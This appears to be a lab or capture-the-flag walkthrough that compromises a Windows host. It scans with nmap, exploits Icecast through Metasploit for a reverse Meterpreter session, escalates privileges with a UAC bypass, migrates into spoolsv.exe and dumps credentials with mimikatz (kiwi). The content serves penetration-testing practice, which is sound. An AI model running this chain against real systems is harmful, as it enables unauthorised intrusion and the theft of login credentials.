First do an NMAP on just the IP address
	nmap 10.10.68.241
When open ports come back lets see more information about those different ports
	sudo nmap -sS -Pn -A -vv -A -p135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 10.10.68.241 -sV
Now that we have completed the first step, lets move on to the next one
	msfconsole
	search icecast
We can see here that their is an exploit for windows icecast, lets use that exploit
	use icecast, or just use 0
Now look at the only one that needs to be filled in 
	RHOSTS
Now set the LHOSTS to what is shown on the access machine page (should be 10 network) 
Make the RHOSTS the remote machine IP address
	exploit
You should make a meterpreter connection
Now lets see what user was running the icecast connection
	getuid
What build is the system running
	sysinfo
Now lets see if there are any suggested exploits from meterpreter
	run post/multi/recon/local_exploit_suggesterrun post/multi/recon/local_exploit_suggester
Looking at the first attack	
	exploit/windows/local/bypassuac_eventvwr
Now background the session (if you need to list sessions just type in the command session)
	background or CTRL-z
Now using the command show options will show us that we need to set a session number
	set session 1
	show options
We can see the Listening Host is incorrect, change the LHOST
	LHOST xxx.xxx.xxx.xxx
Now run the attack
	run
We can see that we now have more session numbers, meterpreter opened again
Now lets see if we have expanded out priveleges
	getprivs
We can now take ownership of files, this is shown with
	SeTakeOwnershipPrivilege
With escalate priveleges we can now see the processes listed
	ps
We need to interact with the lsass service, this service is used for windows authentication
We need to interact with another object that will allow us to be able to retrive lsass information
this means that the service needs to fall within the NT authority and system 32.
	spoolsv.exe (used for printing)
Now lets migrate into the spoolsv.exe process
	migrate -N spoolsv.exe (-N is the name of the process)
To see what user we are now utilize the following command
	getuid (as you can see we are now NT Authority/System (we are now administrators)
Now lets use mimikatz to do a password dump
	load kiwi (new version of mimikatz)
Lets retrive all credentials
	creds_all
